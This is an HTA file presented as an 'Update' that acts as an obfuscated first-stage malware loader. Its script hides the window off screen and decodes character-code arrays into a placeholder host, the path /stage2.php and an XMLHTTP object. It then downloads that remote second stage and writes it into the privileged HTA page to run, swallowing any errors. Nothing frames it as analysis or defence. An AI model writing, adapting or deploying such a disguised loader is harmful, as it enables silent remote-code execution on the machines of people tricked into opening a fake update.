<html>
<head>
<title>Update</title>
<HTA:APPLICATION
    ID="updater"
    APPLICATIONNAME="updater"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    WINDOWSTATE="normal" />
<script language="JScript">
    window.resizeTo(1,1);
    window.moveTo(-1500,-1500);
    var dec=function(c){return String.fromCharCode.apply(null,c);};
    var host=[99,100,110,46,101,120,97,109,112,108,101,46,105,110,118,97,108,105,100];
    var path=[47,115,116,97,103,101,50,46,112,104,112];
    var prog=[77,115,120,109,108,50,46,88,77,76,72,84,84,80,46,54,46,48];
    var mGet=[71,69,84];
    var mOpen=[111,112,101,110];
    var mSend=[115,101,110,100];
    var mStatus=[115,116,97,116,117,115];
    var mBody=[114,101,115,112,111,110,115,101,84,101,120,116];
    var mWrite=[119,114,105,116,101];
    var mClose=[99,108,111,115,101];
    var url='https://'+dec(host)+dec(path);
    try{
        var xhr=new ActiveXObject(dec(prog));
        xhr[dec(mOpen)](dec(mGet),url,false);
        xhr[dec(mSend)]();
        if(xhr[dec(mStatus)]==200){
            document[dec(mWrite)](xhr[dec(mBody)]);
            document[dec(mClose)]();
        }
    }catch(e){}
</script>
</head>
<body></body>
</html>
